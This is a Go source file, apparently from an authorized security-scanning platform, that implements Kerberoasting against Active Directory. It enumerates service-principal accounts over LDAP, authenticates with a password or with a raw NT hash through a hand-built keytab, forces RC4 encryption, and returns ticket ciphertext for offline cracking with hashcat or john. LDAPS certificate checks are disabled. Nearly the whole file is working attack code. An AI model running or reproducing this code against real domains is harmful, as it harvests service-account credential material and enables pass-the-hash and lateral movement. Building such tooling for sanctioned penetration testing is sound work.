package scanner

// RealKerberoaster 是 Kerberoaster 的进程内真实实现（欠账：§9 拍板项 9——
// Kerberoasting 从 stub 换成真实功能，不再依赖独立 sidecar）。
//
// 两条链路：
//   - DomainSPNs：go-ldap 连域控 389，rootDSE 取 defaultNamingContext 作为搜索
//     基准，拉 (servicePrincipalName=*) 账号的 sAMAccountName / SPN /
//     userAccountControl。任何已认证域用户默认都能读这些属性——这是
//     Kerberoasting 成立的前提，也意味着枚举不需要特权账号。
//   - GetTGS：gokrb5 走 AS-REQ（密码或 NT hash keytab 预认证）拿 TGT，再对
//     目标 SPN 发 TGS-REQ。返回的是 TGS-REP 里 ticket.enc-part 的密文
//     （etype 23，用服务账号 NT hash 加密）——这正是 Kerberoasting 的战利品，
//     喂给 CrackKRB5TGS23 或 hashcat 13100 / john --format=krb5tgs 离线破解。
//
// KDC 发现：本地测试网络往往没有域 DNS（SRV 记录 NXDOMAIN），所以按
// JINGWEI_KDC_ADDR 环境变量 → DNS SRV (_kerberos._tcp.REALM) → SPN host
// 解析的顺序兜底。realm 从 SPN host 的域后缀推导（dc1.jwlab.local →
// JWLAB.LOCAL）；SPN host 是 NetBIOS 短名时退化到 JINGWEI_KERBEROS_REALM。
//
// 平台只持有探测目标域账号自己的凭据（台账里登记的），GetTGS 用它做普通
// 域用户认证——Kerberoasting 本身就是「普通用户也能要服务票据」，不涉及
// 任何特权提升路径；guard 的范围管控照常覆盖 LDAP/KDC 目标。

import (
	"context"
	"crypto/tls"
	"encoding/binary"
	"encoding/hex"
	"errors"
	"fmt"
	"net"
	"os"
	"strings"
	"time"

	ldap "github.com/go-ldap/ldap/v3"
	"github.com/jcmturner/gokrb5/v8/client"
	"github.com/jcmturner/gokrb5/v8/config"
	"github.com/jcmturner/gokrb5/v8/keytab"
)

// kerberosUDPBestEffort：gokrb5 默认先试 UDP，Samba DC 对大 TGT 会回
// KRB-ERROR TOO_BIG。直接声明走 TCP 免掉一次往返。
const (
	kerberosDefaultPort   = "88"
	ldapDefaultPort       = "389"
	envKDCAddr            = "JINGWEI_KDC_ADDR"
	envKerberosRealm      = "JINGWEI_KERBEROS_REALM"
	spnRecordQueryTimeout = 15 * time.Second
)

// RealKerberoaster 实现scanner.Kerberoaster 的生产语义；无实例状态，
// 并发调用安全。
type RealKerberoaster struct{}

// NewRealKerberoaster 构造进程内实现，供启动时 RegisterKerberoaster 接线。
func NewRealKerberoaster() *RealKerberoaster { return &RealKerberoaster{} }

// realmFromSPN 从 SPN 推导 Kerberos realm 与 host。SPN 形如
// "MSSQLSvc/dc1.jwlab.local:1433" → realm JWLAB.LOCAL，host dc1.jwlab.local。
// host 是 NetBIOS 短名（无点）时 realm 推不出来，回落到
// JINGWEI_KERBEROS_REALM 环境变量。
func realmFromSPN(spn string) (realm, host string, err error) {
	// SPN 的主体在第一个 "/" 之后；host 可能带 ":port" 后缀。
	parts := strings.SplitN(spn, "/", 2)
	if len(parts) != 2 || strings.TrimSpace(parts[1]) == "" {
		return "", "", fmt.Errorf("SPN %q 缺少 host 部分", spn)
	}
	host = parts[1]
	if i := strings.LastIndex(host, ":"); i >= 0 {
		host = host[:i]
	}
	host = strings.TrimSuffix(strings.TrimSpace(host), ".")
	if strings.Contains(host, ".") {
		// 去掉第一段主机名，剩下的域后缀就是 realm。
		domain := host[strings.Index(host, ".")+1:]
		if domain != "" {
			return strings.ToUpper(strings.TrimSuffix(domain, ".")), host, nil
		}
	}
	if v := strings.TrimSpace(os.Getenv(envKerberosRealm)); v != "" {
		return strings.ToUpper(v), host, nil
	}
	return "", host, fmt.Errorf("无法从 SPN %q 推导 realm（host %q 不是 FQDN），请设置 %s", spn, host, envKerberosRealm)
}

// discoverKDC 按环境变量 → DNS SRV → SPN host 解析的顺序找 KDC 地址。
// 返回 "addr:88" 形式。
func discoverKDC(realm, spnHost string) string {
	if v := strings.TrimSpace(os.Getenv(envKDCAddr)); v != "" {
		if _, _, err := net.SplitHostPort(v); err != nil {
			v = net.JoinHostPort(v, kerberosDefaultPort)
		}
		return v
	}
	// SRV：_kerberos._tcp.REALM。本地网络没有域 DNS 时失败，继续下一层。
	if realm != "" {
		if _, addrs, err := net.LookupSRV("kerberos", "tcp", strings.ToLower(realm)); err == nil && len(addrs) > 0 {
			return net.JoinHostPort(strings.TrimSuffix(addrs[0].Target, "."), fmt.Sprint(addrs[0].Port))
		}
	}
	// SPN host 本身可解析 → 它就是域控（常见小环境部署）。
	if _, err := net.LookupHost(spnHost); err == nil {
		return net.JoinHostPort(spnHost, kerberosDefaultPort)
	}
	// 最后兜底：realm 域名自身。
	if realm != "" {
		if _, err := net.LookupHost(strings.ToLower(realm)); err == nil {
			return net.JoinHostPort(strings.ToLower(realm), kerberosDefaultPort)
		}
	}
	return net.JoinHostPort(spnHost, kerberosDefaultPort)
}

// forceRC4Only 把 config 的 AS/TGS/许可 etype 集合都钉死到 RC4（etype 23）。
// 供 NT hash keytab 路径用——与上面 keytabFromNTHash 的 etype 约束配套。
func forceRC4Only(cfg *config.Config) {
	rc4 := int32(23) // etypeID.RC4_HMAC
	cfg.LibDefaults.DefaultTktEnctypeIDs = []int32{rc4}
	cfg.LibDefaults.DefaultTGSEnctypeIDs = []int32{rc4}
	cfg.LibDefaults.PermittedEnctypeIDs = []int32{rc4}
}

// krb5ConfigString 生成最小 krb5.conf：default_realm 指向目标域，KDC 指向
// 发现到的地址。dns_lookup_* 关闭——本地网络多半没有域 DNS，让 config 不去
// 问 DNS，直连给定地址。
func krb5ConfigString(realm, kdcAddr string) string {
	lowerRealm := strings.ToLower(realm)
	return fmt.Sprintf(`[libdefaults]
	default_realm = %s
	dns_lookup_realm = false
	dns_lookup_kdc = false
	udp_preference_limit = 1
	default_tkt_enctypes = arcfour-hmac-md5 aes256-cts-hmac-sha1-96
	default_tgs_enctypes = arcfour-hmac-md5 aes256-cts-hmac-sha1-96

[realms]
	%s = {
		kdc = %s
	}

[domain_realm]
	.%s = %s
	%s = %s
`, realm, realm, kdcAddr, lowerRealm, realm, lowerRealm, realm)
}

// keytabFromNTHash 手工编码 MIT keytab v2 二进制（gokrb5 keytab.AddEntry 只
// 收明文口令，而 Kerberoasting 台账常见只有 NT hash）。格式参考
// gokrb5/keytab.Unmarshal：version 05 02，entry 全部大端。
//
// 同一 (账号, RC4 key) 按 kvno 1..8 重复编 8 个 entry：gokrb5 的
// GetEncryptionKey 对 kvno 做精确匹配（AS_REP 会带回 KDC 侧的真实 kvno），
// 而离线台账无从得知口令轮换了几代——多 kvno 覆盖是最稳的兼容做法。
func keytabFromNTHash(user, realm string, ntHash []byte) (*keytab.Keytab, error) {
	if len(ntHash) != 16 {
		return nil, fmt.Errorf("NT hash 长度应为 16 字节，得到 %d", len(ntHash))
	}
	var out []byte
	out = binary.BigEndian.AppendUint16(out, 0x0502)
	for _, kvno := range []uint32{1, 2, 3, 4, 5, 6, 7, 8} {
		var entry []byte
		put16 := func(v uint16) { entry = binary.BigEndian.AppendUint16(entry, v) }
		put32 := func(v uint32) { entry = binary.BigEndian.AppendUint32(entry, v) }

		put16(1)                  // num_components（不含 realm）
		put16(uint16(len(realm))) // realm
		entry = append(entry, realm...)
		put16(uint16(len(user))) // 唯一 component = 账号名
		entry = append(entry, user...)
		put32(1)          // name_type = KRB5_NT_PRINCIPAL
		put32(0)          // timestamp
		entry = append(entry, byte(kvno)) // KVNO8
		put16(23)         // enctype arcfour-hmac-md5
		put16(uint16(len(ntHash)))
		entry = append(entry, ntHash...)
		// entry 尾部的可选 32-bit kvno（gokrb5 读了它就覆盖 KVNO8）——必须带上，
		// 否则 KVNO=0 会被 AS_REP 回带的真实 kvno 精确匹配拒绝。
		put32(kvno)

		out = binary.BigEndian.AppendUint32(out, uint32(len(entry)))
		out = append(out, entry...)
	}
	out = binary.BigEndian.AppendUint32(out, 0)

	kt := keytab.New()
	if err := kt.Unmarshal(out); err != nil {
		return nil, fmt.Errorf("构造 NT hash keytab 失败: %w", err)
	}
	return kt, nil
}

// GetTGS 为 spn 申请 user 的 TGS 票据（scanner.Kerberoaster 接口实现）。
// useHash 为真时 password 传 32 位 hex NT hash（手工 keytab 预认证），否则
// 传明文。返回 ticket.enc-part 密文的 hex（服务账号 NT hash 加密，etype 23）。
func (r *RealKerberoaster) GetTGS(ctx context.Context, user, password, spn string, useHash bool) (string, error) {
	if strings.TrimSpace(user) == "" || strings.TrimSpace(password) == "" || strings.TrimSpace(spn) == "" {
		return "", errors.New("GetTGS：user/password/spn 均不能为空")
	}
	realm, host, err := realmFromSPN(spn)
	if err != nil {
		return "", err
	}
	// user 可能已是 UPN（svc-sql@JWLAB.LOCAL）：realm 已带，去掉后缀。
	if i := strings.IndexByte(user, '@'); i >= 0 {
		realm = strings.ToUpper(user[i+1:])
		user = user[:i]
	}
	kdcAddr := discoverKDC(realm, host)
	cfg, err := config.NewFromString(krb5ConfigString(realm, kdcAddr))
	if err != nil {
		return "", fmt.Errorf("生成 krb5.conf 失败: %w", err)
	}

	var cl *client.Client
	if useHash {
		nt, err := hex.DecodeString(strings.ToLower(strings.TrimSpace(password)))
		if err != nil || len(nt) != 16 {
			return "", fmt.Errorf("NT hash 须为 32 位 hex，解析失败: %w", err)
		}
		// NT hash 只能构造 RC4 key（AES key 是独立 PBKDF2 派生，没有明文算不出），
		// 所以 hash 路径强制整条协商链只用 RC4——否则 gokrb5 会按首选 etype 18
		// 去 keytab 找 key，直接 miss。
		forceRC4Only(cfg)
		kt, err := keytabFromNTHash(user, realm, nt)
		if err != nil {
			return "", err
		}
		cl = client.NewWithKeytab(user, realm, kt, cfg, client.DisablePAFXFAST(true))
	} else {
		cl = client.NewWithPassword(user, realm, password, cfg, client.DisablePAFXFAST(true))
	}
	defer cl.Destroy()

	// 进程内实现按调用方给的 ctx 尊重取消：gokrb5 的网络层不吃 ctx，这里用
	// goroutine + select 收敛超时语义。
	type result struct {
		tgsHex string
		err    error
	}
	done := make(chan result, 1)
	go func() {
		tgs, _, err := cl.GetServiceTicket(spn)
		if err != nil {
			done <- result{"", fmt.Errorf("TGS 申请失败（spn=%s realm=%s kdc=%s）: %w", spn, realm, kdcAddr, err)}
			return
		}
		if tgs.EncPart.EType != 23 {
			// AES-only 服务账号拿不出 RC4 裂纹——照实返回让上层定性，不算失败。
			done <- result{"", fmt.Errorf("服务票据 etype=%d 非 RC4(23)，无法离线破解（服务账号可能仅启用 AES）", tgs.EncPart.EType)}
			return
		}
		done <- result{hex.EncodeToString(tgs.EncPart.Cipher), nil}
	}()
	select {
	case <-ctx.Done():
		return "", ctx.Err()
	case res := <-done:
		return res.tgsHex, res.err
	}
}

// DomainSPNs 通过 LDAP bind 枚举可见的 servicePrincipalName（接口实现）。
// ldapEndpoint 形如 ldap://172.23.0.7:389；ldapUser 可为 sAMAccountName 或
// UPN。一条账号挂多个 SPN 时每个 SPN 产出一条 SPNRecord。
func (r *RealKerberoaster) DomainSPNs(ctx context.Context, ldapEndpoint, ldapUser, ldapPassword string) ([]SPNRecord, error) {
	if strings.TrimSpace(ldapEndpoint) == "" {
		return nil, errors.New("DomainSPNs：ldapEndpoint 不能为空")
	}
	var conn *ldap.Conn
	var err error
	if strings.HasPrefix(strings.ToLower(ldapEndpoint), "ldaps") {
		conn, err = ldap.DialURL(ldapEndpoint, ldap.DialWithTLSConfig(&tls.Config{InsecureSkipVerify: true})) //nolint:gosec // 内网自签域控是常态，指纹校验不适用
	} else {
		conn, err = ldap.DialURL(ldapEndpoint)
	}
	if err != nil {
		return nil, fmt.Errorf("LDAP 连接失败（%s）: %w", ldapEndpoint, err)
	}
	defer conn.Close()
	conn.SetTimeout(spnRecordQueryTimeout)

	// bind 身份：UPN 直接用；裸账号名补上默认域后缀（从 rootDSE 推）。
	bindUser := strings.TrimSpace(ldapUser)
	baseDN := ""
	if !strings.Contains(bindUser, "@") {
		baseDN, err = rootDSENamingContext(conn)
		if err != nil {
			return nil, err
		}
		bindUser = bindUser + "@" + dnToRealm(baseDN)
	}
	if err := conn.Bind(bindUser, ldapPassword); err != nil {
		return nil, fmt.Errorf("LDAP bind 失败（%s）: %w", bindUser, err)
	}
	if baseDN == "" {
		baseDN, err = rootDSENamingContext(conn)
		if err != nil {
			return nil, err
		}
	}

	req := ldap.NewSearchRequest(baseDN, ldap.ScopeWholeSubtree, ldap.NeverDerefAliases,
		0, int(spnRecordQueryTimeout.Seconds()), false,
		"(&(objectCategory=person)(servicePrincipalName=*))",
		[]string{"sAMAccountName", "servicePrincipalName", "userAccountControl"},
		nil)
	res, err := conn.SearchWithPaging(req, 500)
	if err != nil {
		return nil, fmt.Errorf("LDAP SPN 查询失败（base=%s）: %w", baseDN, err)
	}

	out := make([]SPNRecord, 0, len(res.Entries))
	for _, e := range res.Entries {
		u := strings.TrimSpace(e.GetAttributeValue("sAMAccountName"))
		disabled := false
		// userAccountControl 是十进制字符串标志位；ACCOUNTDISABLE = 0x0002。
		if v := strings.TrimSpace(e.GetAttributeValue("userAccountControl")); v != "" {
			var uac int
			if _, err := fmt.Sscanf(v, "%d", &uac); err == nil && uac&0x0002 != 0 {
				disabled = true
			}
		}
		for _, spn := range e.GetAttributeValues("servicePrincipalName") {
			spn = strings.TrimSpace(spn)
			if u == "" || spn == "" {
				continue
			}
			out = append(out, SPNRecord{User: u, SPN: spn, Enabled: !disabled})
		}
	}
	return out, nil
}

// rootDSENamingContext 读 rootDSE 的 defaultNamingContext（域的基准 DN）。
func rootDSENamingContext(conn *ldap.Conn) (string, error) {
	req := ldap.NewSearchRequest("", ldap.ScopeBaseObject, ldap.NeverDerefAliases,
		0, 0, false, "(objectClass=*)", []string{"defaultNamingContext"}, nil)
	res, err := conn.Search(req)
	if err != nil {
		return "", fmt.Errorf("rootDSE 查询失败: %w", err)
	}
	if len(res.Entries) == 0 {
		return "", errors.New("rootDSE 无返回条目")
	}
	nc := strings.TrimSpace(res.Entries[0].GetAttributeValue("defaultNamingContext"))
	if nc == "" {
		return "", errors.New("rootDSE 未含 defaultNamingContext（目标可能不是 AD 域控）")
	}
	return nc, nil
}

// dnToRealm 把 "DC=jwlab,DC=local" 转成 "JWLAB.LOCAL"。
func dnToRealm(dn string) string {
	parts := strings.Split(dn, ",")
	out := make([]string, 0, len(parts))
	for _, p := range parts {
		p = strings.TrimSpace(p)
		if v, ok := strings.CutPrefix(p, "DC="); ok {
			out = append(out, v)
		}
	}
	return strings.ToUpper(strings.Join(out, "."))
}

// 编译期断言：RealKerberoaster 满足 Kerberoaster 接口。
var _ Kerberoaster = (*RealKerberoaster)(nil)
